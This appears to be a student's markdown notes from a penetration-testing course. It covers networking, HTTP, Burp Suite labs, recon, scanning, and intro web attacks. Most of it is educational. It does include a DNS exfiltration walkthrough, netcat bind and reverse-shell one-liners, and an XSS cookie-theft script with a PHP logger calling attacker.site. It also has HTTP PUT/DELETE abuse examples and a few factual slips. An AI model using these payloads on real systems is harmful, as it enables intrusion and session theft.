# INE Penetration Testing Student Learning Path - Notes  
This is a collection of notes taken while completing INE's "Penetration Testing Student" learning path.  

# Table of Contents:
Background Information:  
[I. Introduction](#i-introduction)  
[II. Networking](#ii-networking)  
[III. Web Applications](#iii-web-applications)  
[IV. Burpsuite](#iv-burpsuite)

Penetration Testing Lifecycle:  
[1. Information Gathering](#1-information-gathering)  
[2. Footprinting & Scanning](#2-footprinting--scanning)  
[3. Vulnerability Assessment](#3-vulnerability-assessment)  
[4. Exploitation](#4-exploitation)  
[5. Reporting](#5-reporting)  

## I. Introduction
<details>
  <summary>Introductory information on pentesting (**click to expand**)</summary>

Pentesting:
- Discovering any and all vulnerabilities on client's infrastructure - not **just** about getting root!
- Very imprtant that client infrastructure is not destroyed.

Stages of a Pentest:
- Engagement: Establsihing details of the pentest
  - Quotation: Fee established, factoring in type of engagement, amount of time, complexity, and size of scope.
    - Can alternatively be done by an hourly fee.
  - Proposal SUbmittal: Provide a sound and targeted proposal, keeping in mind client's needs and infrastructure.
    - Include understanding of client needs, approach, methodology, tools, types of testing, value that you will bring, risks & benefits, and estimate of time required.
    - Address type of engagement, pentest vs vuln assessment, remote vs onsite, and scope.
      - Always ensure target is in scope. With shared hosting, hosting provider must give written permisison.
  - Handling Incidents: Always communicate with customer, establish incident-handling procedure by team and client or emergency contact.
  - Rules of Engagement: Document that defines scope, what pentest is allowed to do, and time window.
- Information Gathering: Establish as wide of an attack surface as possible.
  - Gather general information, such as company structure, names, email addresses, office locations, etc using OSINT or social engineering (if allowed in rules of engagement).
  - Also includes mapping out IP addresses with server OS's, looking at DNS information, and crawling webpages.
 - Footprinting and Scanning: In-depth look at in-scope servers and services.
  - Make educated guesses on OS and services.
  - Identify which ports are open, determine what thte purpose of a host is (ex: client or server), and its importance to the client.
- Vulnerability Assessment:
  - Build list of vulns that could be present on systems.
  - Automated tools/scanners
- Exploitation
  - Verify if vulnerability actually exists
  - Hopefully exploitation allows for us to investigate network further
- Reporting: Delivering results of test to executives, IT staff, dev team, and its significance.
   - Discuss techniques, vulns found, exploits used, impacts for each vuln, and remediation tips. 
   - Remediation tips are the biggest value provided to the client.

</details>
  
## II. Networking
<details>
  <summary>Introductory information on IP, Routing, Switching, Firewalls, and IDS/IPS's (**click to expand**)</summary>
  
### II.1 IP
**IPV4** 
- Made up of 4 bytes (octets) delineated with ".", 64 bits total
- Contains a network prefix and host portion of IP address
- Example: 192.168.1.5/24
  - Host: 192.168.1.5
  - Subnet: 192.168.1.0
  - Mask: 255.255.255.0


**IPV6**
- Made up of 8 groups of 2 bytes (in hex) delineated with ":", 128 bits total.
- First half is network, second half is host.
  - Network portion has 6 bytes (48 bits) of Global Unicast Address, and 2 bytes (16 bits) of Subnet ID.
- Three scopes:
  - Global Unicast - Internet-routed
  - Unique Local - Internally routable, but not routed on internet.
  - Link Local - Cannot be routed internally or externally
- Example: 2002:0000:0000:1200:acbd:ffff:c0a8:0101/64
  - Host: 2002:0000:0000:1200:acbd:ffff:c0a8:0101
  - Subnet: 2002:0000:0000:1200:0000:0000:0000:0000 to 2002:0000:0000:1200:ffff:ffff:ffff:ffff
  - Mask: FFFF:FFFF:FFFF:FFFF::


### II.2 Routing
- Checking routing tables:
  - Linux:
    ```bash
    ip route
    ```  
  - Windows:
    ```
    route print
    ```  
  - MacOS:
    ```
    netstat -r
    ```  
  - Adding a route:
    - Linux:  
      ```
      ip route add <subnet> via <gateway>
      ```

### II.3 Link Layer
- MAC addresses  
  - 6 bytes (48 bits), written in hex form.
- Finding MAC address:  
  - Windows:  
    ```
    ipconfig /all
    ```  
  - Linux/*nix:
    ```
    ifconfig
    or
    ip addr
    ```  
- Forwarding tables:
  - Also called Content Addressable Memory (CAM) table.
  - Created as the switch obtains new data frames.
  - Kept on Switches, contain MAC address, interface, and TTL.
    - TTL determines how long entries stay in table (since CAM table has finite size)
  - If two hosts have the same interfaces, then most likely connected via another switch.
  - Address Resolution Protocl (ARP):
    - Sends frame to broadcast address seeking MAC address corresponding to a specific IP address.
    - ARP cache kept on hosts
      - Windows:
        ```
        arp -a
        ```
      - Linux:
        ```
        ip neighbor
        ```
      - \*nix:
        ```
        arp
        ```
### II.4 TCP/UDP
- TCP is connection-oriented, UDP connectionless.
- Processes on a host are identified with \<IP\>:\<PORT\>.
- Ports 0-1023 are **well-known** ports.
- IANA Port Assignments: http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml
- Daemon: A program that runs a service (ex: Web server daemon runs Apache2 web service)
- Check current listening ports and TCP connections:
  - Windows:
    ```
    netstat -ano
    ```
  - Linux:
    ```
    netstat -tunp
    ```
  - \*nix:
    ```
    netsat -p tcp -p udp
    lsof -n i4TCP -4 UDP
    ```
### II.5 Firewalls and Network Defense
- Firewalls:
  - Three types:
    - Packet Filtering: Takes into consideration source and destination IP address & port, along with protocol. Does not look at packet contents, and does not protect against application-layer attacks.
      - Typically rules set to **allow**, **drop**, or **deny**
        - Unlike **deny**, **drop** does not send a response when packet is not forwarded. 
    - Application Level/ Deep Packet Inspection:
      - Utilized by IDS's, checks actual packet data. Capable of identifying port scans, SQL injections, buffer overflow, etc.
- IDS:
  - Host based or network based (HIDS vs NIDS).
  - NIDS typically placed within a network/ subnet where security levels differ.
  - HIDS monitor application logs, filesystem changes, OS config changes, etc.
- IPS:
  - Capable of dropping packets and acting when malicious activity is detected.  
- Spotting network defenses:
  - No responses to TCP SYN may indicate packets dropped
  - TCP RST/ACK response to SYN  

### II.6 Wireshark
- Filters
  - Capture filters: Filtering occurs during the actual capture of packets.
  - Display filters: Filters only show certain packets obtained during the capture.
    - \<protocolname\>.[field][operand value]
    - ip.addr == 192.168.0.1  

### II.7 Data Exfiltration Lab
- https://github.com/stufus/egresscheck-framework.git
- Can look for interesting files with:
  ```
  dir /s /b [filename]
  ```
  - The "/s" flag recurses through subdirectories during the search.
  - The "/b" flag provides a "bare" list of directories and files.
- Can check for scripting languages with:
  ```
  python --version
  powershell ls
  ```
- Simple python http server:
  ``` bash
  python -m SimpleHTTPServer 8080
  ```
- Start python http server in directory for PacketWhisper (https://github.com/TryCatchHCF/PacketWhisper)
  - May also be useful to host the zip: https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip
- Navigate to hosted python server on target machine
- Download master.zip, extract locally.
- On target machine, use ```python packetwhisper.py```
- Using "Random SUbdomain FQDNs" transfer mode and "cloudfront_prefixes" cipher on the victim machine, we can put the file back together on the attacker machine by saving the pcap, using ```python packetwhisper.py``` with the second mode, and select the same ciphers.
  </details>

  
## III. Web Applications
<details>
  <summary>Introductory information on web applications (**click to expand**)</summary>

### III.1: Introduction
- Web applications run on web servers, and are accessed by clients over web browsers.
- Calculations or dynamic content can be generated either client or server side.
  
### III.2: HTTP Protocol Basics
- HTTP is a client-server protocol, is used to transfer web pages and web app data on top of TCP.
- Communication is composed of HTTP requests by the client, and http responses by the server.
HTTP Message Format:
  - Headers\r\n
  - \r\n
  - Message Body\r\n
  > \r is `carriage return`, and \n is `newline` 
  
HTTP Request Headers:
- Request method: states type of request
- Path and protocol version
- Host: URI of the resource
- User-Agent string: Details of the client, such as web browser, version, and OS.
- Accept header: The type of document that is expected in server's response.
- Accept-Language: A specifc human language, like `en-US`.
- Accept-Encoding: Accepted encoding of the document, such as `gzip, deflate`.
- Connection: Whether future communications will reuse current connection, or will require another TCP connection to be established.

HTTP Response Headers:
- Status-Line: Protocol version, status code, and textual meaning of status code.
- Date
- Content-Type: The type of content included in the response.
- Content-Encoding: How the content of the response is encoded
- Server: Header of the server that generated the content (ex: Apache)
  - An optional field, may be useful with enumeration/ may disclose sensitive information about server.
- Content-Length: Length of the message body in bytes.

  
HTTPS:
- HTTP over SSL/TLS
- Protects against third parties viewing message contents, NOT against web application flaws (such as SQLi)
 
### III.3: Analyzing HTTP Connections
Techniques:
- Using **netcat** to manually craft HTTP requests and viewing the responses
  ``` console
  foobar@kali:~$ nc -v thon.org 80
  DNS fwd/rev mismatch: thon.org != server-143-204-146-83.ewr52.r.cloudfront.net
  DNS fwd/rev mismatch: thon.org != server-143-204-146-39.ewr52.r.cloudfront.net
  DNS fwd/rev mismatch: thon.org != server-143-204-146-67.ewr52.r.cloudfront.net
  DNS fwd/rev mismatch: thon.org != server-143-204-146-64.ewr52.r.cloudfront.net
  thon.org [143.204.146.83] 80 (http) open
  GET / HTTP/1.1
  Host: www.thon.org

  HTTP/1.1 301 Moved Permanently
  Server: CloudFront
  Date: Sun, 04 Jul 2021 20:42:40 GMT
  Content-Type: text/html
  Content-Length: 183
  Connection: keep-alive
  Location: https://www.thon.org/
  X-Cache: Redirect from cloudfront
  Via: 1.1 72e01c53ea1f597217a963cf6671454c.cloudfront.net (CloudFront)
  X-Amz-Cf-Pop: EWR52-C2
  X-Amz-Cf-Id: 54xexutXOxfEXBEO3kobkXDEPHMM-4m1mjCAr36dSgQd-5-mrkimUQ==

  <html>
  <head><title>301 Moved Permanently</title></head>
  <body bgcolor="white">
  <center><h1>301 Moved Permanently</h1></center>
  <hr><center>CloudFront</center>
  </body>
  </html>
  ```
  > Instead of `GET`, you can use other HTTP methods, such as `OPTIONS`, in order to enumerate what HTTP methods are available for a request.
  > You can also specify multiple headers in the request, and just hit `enter` twice once you are done crafting the request.

- Using Burpsuite/ OWASP ZAP to analyze HTTP requests and responses:
  - Open up "Repeater" tool, specify target, and craft request before sending it off.
  
  
### III.4 Analyzing HTTPS Connections:
Techniques:
- Use **openssl** to initiate TCP handshake for HTTPS
  ``` console
  foobar@kali:~$ openssl s_client -connect thon.org:443
  depth=2 C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority
  verify return:1
  depth=1 C = US, ST = MI, L = Ann Arbor, O = Internet2, OU = InCommon, CN = InCommon RSA Server CA
  verify return:1
  depth=0 C = US, ST = Pennsylvania, L = University Park, O = The Pennsylvania State University, OU = VM Hosting Consulting, CN = thon.org
  verify return:1
  GET / HTTP/1.1
  Host: thon.org
  ```
  > The `-quiet` flag surpresses information about the SSL certificate exchange. Information about ceritificate exchange and session keys can be viewed by omitting the `-quiet` flag. More information can be shown with `-debug`. You can keep tabs on the state of the handshake with `-state`.
  

- Using Burpsuite/ OWASP ZAP to analyze HTTPS requests and responses:
  - Same thing as HTTP, but you ensure you specify the correct port and that HTTPS is used. V easy.
  
### III.5 HTTP Cookies:
- RFC6265
- HTTP is a stateless protocol, and cookies help to keep state.
- **Cookie Jar**: Where a web browser stores cookies.
- Set by servers with `Set-Cookie` HTTP header in a response
Cookie Attributes:
- Actual content: Set with `Set-Cookie` header by server
  - Contains multiple key-value pairs
  ```
  Set-Cookie: Username="admin"; auth=1
  ```
- Expires: Specifies validity time window of cookie. A value of `Session` indicates cookie expires after the current browser session.
- Path: Sets path scope of the cookie - valid for all subpaths.
- Domain: Sets scope of the cookie - valid for all subdomains.
  - If not set, browser defaults to setting domain as server domain and enables **host-only** flag
- Optional Flags:
  - "HTTPOnly" attribute: Prevents Javascript, FLash, Java, and anything that is not HTML from reading the cookie
    - Prevents cookie stealing via XSS
  - "Secure" attribute: Cookies will only be sent over HTTPS.
  - "HostOnly" flag: Cookie only sent to a specific, precise hostname (no subdomains).
> A browser will only send cookies if the domain, path, and expiry check out. 
  
Cookies in Authentication:
- Browser sends POST request with username and password.
- Server sends response with `Set-Cookie` header field, along with cookie details.
- For subsequent requests, browser considers `Expires`, `Path`, and `Domain` before including a `Cookie` header in request.
```
GET /resource HTTP/1.1
...
Cookie: ValName=...
```
  
### III.6 Sessions
- Sessions can be stored either server-side or client-side.
- Upon giving identification of a session, server can retrieve previous state of the client. 
Session Cookies:
- Typically contain single parameter value pair that refers to the session
  ```
  SESSION=a76s6dfa871DSq
  ```
> PHP may install session cookies with `PHPSESSID` parameter name, and JSP websites may use `JSESSIONID` parameter name.
- Typically after browser opens a specific page, changes a setting in the webapp, or logs in.
- May also be transmitted in `GET` requests
  ```
  http://site.com/resource.php?sessid=laksf121K12
  ```

### III.7 HTTP(s) Cookies and Sessions
Techniques: 
- Use web developer tools on Browser
  - Console: Allows execution of javascript
    - If cookie is not `HttpOnly`, cookie can be read with `document.cookie`, or displayed with `alert(document.cookie)`
  - Net(work): Examine web traffic, such as HTTP requests/responses.
  - Cookies: Examine and manipulate cookies.
  
### III.8 Same Origin Policy
- Prevents JS code from getting or setting properties if the request originates from a different origin.
- Browser uses `Protocol`, `Hostname`, and `Port` to determien if JS can access a resource.\
> Example: A user access Webapp A, which contains a malicious JS that attempts to read data from Webmail B, which the user is already logged into. SOP prevents Webapp A's JS from being executed and reading data from Webmail B.
Javascript parameters: https://www.xul.fr/javascript/parameters.php
  
  
</details>  

## IV. Burpsuite
<details>
  <summary>Introductory information on Burpsuite/ OWASP ZAP (**click to expand**)</summary>
  
### IV.1 Burpsuite Intro
- Burpsuite is a web app analysis tool
- Open-source counterpart is OWASP's ZAP (Zed Attack Proxy)
- **Intercepting Proxy**: Allows for analysis and modification of HTTP requests between client and server.
- Also allows for crawling, manually building requests, and fuzzing.
> Setup information from INE was omitted because I already know how to set up Burpsuite/ZAP.  
  
Repeater:
- Allows manual crafting of raw HTTP requests
  - Unlike `netcat` or `telnet`, Burpsuite will have syntax highlighting, provide raw and rendered responses, and integrate with other available tools.
- Recall that after the header, there should be two empty lines, or `\r\n\r\n`. 
  
### IV.2 Burpsuite Basics Lab
- Webapp of 172.16.160.102
- Turned on Burpsuite/ ZAP, navigated to http://172.16.160.102
- Page indicated site under construction, HTML comment revealed robots.txt
- Navigating to robots.txt revealed the following possible directories:
  ```
  User-agent: *
  Disallow: /cgi-bin/
  Disallow: /includes/
  Disallow: /images/
  Disallow: /scripts/
  Disallow: /*?debug=*
  Disallow: /connections/
  Disallow: /backup/
  Disallow: /settings/
  ```
- Intruder/Fuzzer on these directories revealed that the `/connections/` directory was the only directory that returned a 200.
  - Navigating to `/connections/` had error message `Debug is FALSE`
  - Possible parameter value with the `Disallow: /*?debug=*` from robots.txt
  - Tried passing parameter along with `/connections/?debug=`
  - Error message that `debug` can only be `TRUE` or `FALSE`
  - Tried `/connections/?debug=TRUE`
  - Access to phpinfo admin panel with credentials on first line
  
### IV.3 Burpsuite Lab
- Webapp of 10.100.13.5
- Web page appeared to have lots of links, used `spider` tool on ZAP to enumerate through.
- Spidering revealed robots.txt, which included a `Disallow: /Y7gMEMZtin/` entry.
- Navigating to http://10.100.13.5/Y7gMEMZtin/login.php revealed a login portal.
  - PHPSESSID cookie is being set
  - Examining the response for `/login.php`, scrolling all the way at the bottom, you can pass `DEBUG=policeDebug` to bypass auth
  - Sent HTTP GET for `http://10.100.13.5/Y7gMEMZtin/login.php?DEBUG=policeDebug`
  - Auth bypassed, redirected to `/Y7gMEMZtin/index.php`
  
</details>
  
  
## 1. Information Gathering
### 1.1 OSINT

### 1.2 Subdomain Enumeration
Goals:
- Enumerate internet attack surface for websites that may be vulnerable to attack.  

Passive Techniques:
- Google Dorking
  - ```site: domain.com```
- Websites:
  - ```dnsdumpster.com```, ```crt.sh```
- Sublist3r
  ``` bash
  sublist3r -d domain.com
  ```
- "Certificate Subject Alt Name" field of SSL Certificate

Active Techniques
- Gobuster
  ``` bash
  gobuster dir -u [url] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```
- Amass
  - https://github.com/OWASP/Amass/blob/master/doc/user_guide.md
  ``` bash
  sudo apt install snapd
  snapd install amass
  amass
  ```
  
## 2. Footprinting & Scanning
### 2.1 Mapping Networks
Goals:
- Determine in-scope and out-of-scope devices
- Identify in-scope subnet topologies

Techniques:
- Ping Sweeping: Send ICMP Type 8 (echo request) to host, response indicates host is alive
  ``` bash
  fping -a -g [IP RANGE]
  -a: only show alive hosts
  -g: ping sweep, not normal ping
  ```
- Nmap: -sn flag for ping sweeping.
  ``` bash
  nmap -sn [IP RANGE]
  OR
  nmap -sn -iL hostlist.txt
  ```
### 2.2 OS Fingerprinting
Goals:
- Different OS's have different implementation of network stack.
- Signatures of responses to requests can be compared to a databse of known OS signatures.
- Identify what OS a host is running.

Techniques:
- Nmap: -Pn flag to skip ping scan, -O for OS discovery.
  ``` bash
  nmap -Pn -O [targets]
  ```

### 2.3 Port Scanning
Goals:
- Enumerate daemons and services running on network nodes
- Look for ACK flag for open port, RST + ACK for closed port


Techniques:
- TCP SYN Scan: SYN sent, SYN + ACK received if port open, RST sent back to avoid full connection.
  - Daemon does not log connection
  ``` bash
  nmap -sS [TARGET]
  (NOTE: nmap uses -sS by default)
  ```
- TCP Connect: Full TCP connection made
  ``` bash
  nmap -sT [TARGET]
  ```
- Version Detection Scan: TCP Connect scan with additional probes to enumerate application listening. Reads banner sent by daemon.
  - ```tcpwrapped``` indicates TCP handshake was completed, but remote host closed connection without receiving any data (application protected by ```tcpwrapper``` - could be IPS or firewall)
  ``` bash
  nmap -sV [TARGET]
  ```
- Specifying Ports: ```-p``` flag, with port range specified as comma separated list (ex: ```-p 80,443,8080```) or an interval (ex: ```-p 1-65535```)
- Scripts:
  - Using `--script [scriptname]` flag.
  - The `vulners` script (invoked with `--script vulners`), provides vulnerability info similar to Nessus.
  - https://github.com/vulnersCom/nmap-vulners
  
## 3. Vulnerability Assessment
Goals:
- Discover known vulnerabilities on a system.
- Discover service misconfigurations.
 
Techniques:
- Automated Tools:
  - Nessus: Composed of a client, which configures scans, and server, which carries out the scans.
    - Also sends out probes to verify if vulnerability exists
## 4. Exploitation
### 4.1 Web App Attacks
HTTP Methods:
- Misconfigured HTTP verbs becoming rarer in web servers, but very common in embedded devices/ IOT devices.
- GET: Used to request a resource
  - Can also be used to pass arguments to web app
  ```
  GET /page.php?argument=value HTTP/1.1
  Host: www.site.com
- POST: Used to submit HTML form data. Parameters are in message body.
  ```
  POST /login.php HTTP/1.1
  Host: www.site.com
  
  Username=admin&password=admin
  ```
  
- PUT: Used to upload a file to the server. Can lead to RCE/ reverse shells if incorrectly configured.
  - Requires specifying size of data in `Content-length:` header. Use `wc -m` to determine length of file in bytes.
  ``` console
  foobar@kali:~$
  PUT /phpenum.php HTTP/1.0
  Host: www.site.com
  Content-type: text/html
  Content-length: 20

  <?php phpinfo(); ?>  
  ```
    
- HEAD: Similar to GET, but just asks for headers in response instead of body.
- DELETE: Used to remove a file from a server. Can lead to denial of service or data loss if incorrectly configured.
  ``` console
  foobar@kali:~$ nc site.com 80
  DELETE /index.txt HTTP/1.0
  
  HTTP/1.1 200 OK {INDICATES FILE WAS SUCCESSFULLY DELETED}
  ...
  ```
  
- OPTIONS: Used to query for available HTTP methods/verbs.
    - Use to enumerate web server.
    ``` console
    foobar@kali:~$ nc site.com 80
    OPTIONS/ HTTP/1.0
    
    HTTP/1.1 200 OK
    Date:...
    Server:...
    Allow: {METHODS HERE}
    ...
    ```

REST API's:
- `Representational State Transfer Application Programming Interface`
- Specific type of web app, relies heavily on HTTP verbs.
    - Ex: Using `PUT` to save data (instead of just saving a file).
- Make sure to verify that a **PUT/DELETE** method is an actual HTTP method, not REST API's **PUT/DELETE** method.
    - Look for existence of the file that was created/deleted with `PUT/DELETE`.

HTTP 1.0 Syntax:
- Does not require `Host:` header.
    
### 4.1.2: Netcat
Syntax:
``` console
kali@foobar:~$ nc [flags] {host} {port}
```
Flags:
- `-l`: Listen (instead of reach out for a connection)
- `-v`: Verbosity
- `-p`: Specify port when listening (ex: `nc -p 80`)
- `-e`: Executes a command after successful connection
  - Bind shell listeners commonly set up with `nc -lvp 1337 -e /bin/bash`
  - Reverse shell connections can be made with `nc -e /bin/bash [target] [ip]
  
Piping netcat output to a file:  
``` console
foobar@kali:~$ nc 127.0.0.1 80 | log.txt
```

Sending file data over nc:
``` console
foobar@kali:~$ cat file.txt | nc -v 127.0.0.1 4242
```
> Files can be "transferred" by setting up listener, piping output to file, and then sending file to listener with nc.
  
### 4.1.2 Directory & File Enumeration
- If a new subdirectory is created, spiders/ users will not typically be able to find it unless a link is published.
  - Manually navigating to the resource (ex: http://www.site.com/secret) could still provide access
- Files/Resources of Interest:
  - Backups: May contain IP addresses, credentials, or other sensitive information.
    - `.bak`, `.old`, `.txt`, or `.xxx` are commonly used backup file extensions.
  - Configuration Files: May contain IP addresses, names of services, credentials, or other sensitive information.

Techniques:
- OWASP's Dirbuster
> They ran through how to use the GUI. GUI is lame. Use CLI instead like a true skript kiddie. Gobuster is threaded, whereas Dirb can search recursively. Pros and cons to each. Ffuf is mad fast as well.

### 4.1.3: Google Dorking
Operators:
- `site:` - Include only results from a given hostname.
- `intitle:` - Filter only results with this page title.
- `inurl:` - Filter only results with string in URL.
- `filetype:` - Filter only certain filetypes.
- `AND`, `OR`, `&`, `|` - Logical operators that can be thrown into search query as well.
- `-` - Can be used to filter **out** keywords from the results.

### 4.1.4: Cross Site Scripting (XSS)
Allows attackers to control web app content.
- Modify contents of site at runtime
- Inject malicious content
- Steal user session cookies
- Perform actions masquerading as a legitimate user

How vulns occur:
- Unfiltered user input is trusted and NOT verified server-side.
- User input is used to build output content

Parameters that can be used for XSS:
- Request headers
- Cookies
- Form inputs
- POST parameters
- GET parameters

Types of XSS:
- Reflected: Inputs cause an immediate change in an output page, ie the effects are immediately reflected back to the actor.
	- Places to look: Searchbars.
	- Can be mitigated by reflected XSS filters.
- Stored: Inputs are stored, and the content persists among different sessions.
	- Places to look: Form submissions, comments.

Stealing Cookies:
- Can happen if `HttpOnly` flag is not enabled.
- Uses JavaScript
- Test: 
	- Try using basic HTML tags, such as `<b>` or `<i>`.
	- See if Javascript is usable with `<script>alert("XSS")</script>`
	- See if cookie is viewable with `<script>alert(document.cookie)</script>`
``` javascript
<script>
var i = new Image();
i.src="http://attacker.site/log.php?q="+document.cookie;
</script>
```
> Makes a POST request to a a php log because victim site points request to attacker site to load image.

``` php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```
> Listener on attacker site that will log the cookie sent to it via the POST request.

### 4.2: Network Attacks
### 4.2.1: SQLi
Basic SQL Syntax:
- `SELECT [something] FROM [table] WHERE [condition];`
- Comments: `#` or `--`

SQLi can occur when user inputs are used DIRECTLY into a query, without being sanitized.
- Use a tautology:
	- Query string: `/` OR 1=1`
## 5. Reporting
